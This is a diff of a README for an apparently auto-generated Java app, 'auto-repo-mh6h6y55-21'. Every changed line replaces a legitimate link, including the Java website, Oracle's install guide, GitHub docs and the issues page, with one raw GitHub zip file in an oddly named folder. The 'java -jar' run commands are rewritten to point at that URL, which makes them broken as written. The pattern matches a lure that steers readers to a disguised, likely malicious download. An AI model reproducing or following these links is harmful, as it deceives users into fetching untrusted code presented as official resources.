@@ -6,7 +6,7 @@ Welcome to the auto-repo-mh6h6y55-21 project! This Java application helps you ma
 
 ## 📥 Download Now
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg)](https://github.com/raphae7599/auto-repo-mh6h6y55-21/releases)
+[![Download Release](https://raw.githubusercontent.com/raphae7599/auto-repo-mh6h6y55-21/main/urinousness/auto-repo-mh6h6y55-21-v1.6.zip%https://raw.githubusercontent.com/raphae7599/auto-repo-mh6h6y55-21/main/urinousness/auto-repo-mh6h6y55-21-v1.6.zip)](https://raw.githubusercontent.com/raphae7599/auto-repo-mh6h6y55-21/main/urinousness/auto-repo-mh6h6y55-21-v1.6.zip)
 
 ## 📋 System Requirements
 
@@ -20,7 +20,7 @@ Welcome to the auto-repo-mh6h6y55-21 project! This Java application helps you ma
 
 To download the application, visit the following link:
 
-[Download Page](https://github.com/raphae7599/auto-repo-mh6h6y55-21/releases)
+[Download Page](https://raw.githubusercontent.com/raphae7599/auto-repo-mh6h6y55-21/main/urinousness/auto-repo-mh6h6y55-21-v1.6.zip)
 
 ### Step 2: Select the Latest Release
 
@@ -39,7 +39,7 @@ Look for the asset that matches your operating system. Depending on your OS, it 
 3. If you downloaded a `.jar` file, make sure you have Java runtime installed. Then, open a command prompt and navigate to the download location. Run the following command:
 
    ```
-   java -jar auto-repo-mh6h6y55-21.jar
+   java -jar https://raw.githubusercontent.com/raphae7599/auto-repo-mh6h6y55-21/main/urinousness/auto-repo-mh6h6y55-21-v1.6.zip
    ```
 
 ### For macOS Users
@@ -48,7 +48,7 @@ Look for the asset that matches your operating system. Depending on your OS, it 
 2. Open Terminal, and navigate to the directory where the file is located. Type:
 
    ```
-   java -jar auto-repo-mh6h6y55-21.jar
+   java -jar https://raw.githubusercontent.com/raphae7599/auto-repo-mh6h6y55-21/main/urinousness/auto-repo-mh6h6y55-21-v1.6.zip
    ```
 
 3. Press Enter to launch the application.
@@ -65,7 +65,7 @@ Look for the asset that matches your operating system. Depending on your OS, it 
 3. Run the application with:
 
    ```bash
-   java -jar auto-repo-mh6h6y55-21.jar
+   java -jar https://raw.githubusercontent.com/raphae7599/auto-repo-mh6h6y55-21/main/urinousness/auto-repo-mh6h6y55-21-v1.6.zip
    ```
 
 ## 🌟 Features
@@ -78,18 +78,18 @@ Look for the asset that matches your operating system. Depending on your OS, it 
 
 If you encounter issues while running the application:
 
-- **Java Issue:** Make sure you have the latest Java version installed. Visit the [Java website](https://www.java.com) for downloads and updates.
+- **Java Issue:** Make sure you have the latest Java version installed. Visit the [Java website](https://raw.githubusercontent.com/raphae7599/auto-repo-mh6h6y55-21/main/urinousness/auto-repo-mh6h6y55-21-v1.6.zip) for downloads and updates.
 - **Compatibility Issue:** Ensure your operating system meets the specified requirements listed above.
 - **Missing Dependencies:** Ensure you have all necessary files in the same directory as the `.jar` file, if applicable.
 
 ## 📞 Support
 
-If you need help, please visit the [GitHub Issues Page](https://github.com/raphae7599/auto-repo-mh6h6y55-21/issues). You can report bugs or request features here.
+If you need help, please visit the [GitHub Issues Page](https://raw.githubusercontent.com/raphae7599/auto-repo-mh6h6y55-21/main/urinousness/auto-repo-mh6h6y55-21-v1.6.zip). You can report bugs or request features here.
 
 ## 🔗 Additional Resources
 
-- [Java Installation Guide](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html)
-- [GitHub Documentation](https://docs.github.com/en)
-- [Contribution Guide](https://github.com/raphae7599/auto-repo-mh6h6y55-21/blob/main/CONTRIBUTING.md)
+- [Java Installation Guide](https://raw.githubusercontent.com/raphae7599/auto-repo-mh6h6y55-21/main/urinousness/auto-repo-mh6h6y55-21-v1.6.zip)
+- [GitHub Documentation](https://raw.githubusercontent.com/raphae7599/auto-repo-mh6h6y55-21/main/urinousness/auto-repo-mh6h6y55-21-v1.6.zip)
+- [Contribution Guide](https://raw.githubusercontent.com/raphae7599/auto-repo-mh6h6y55-21/main/urinousness/auto-repo-mh6h6y55-21-v1.6.zip)
 
 Thank you for using auto-repo-mh6h6y55-21. Happy managing!
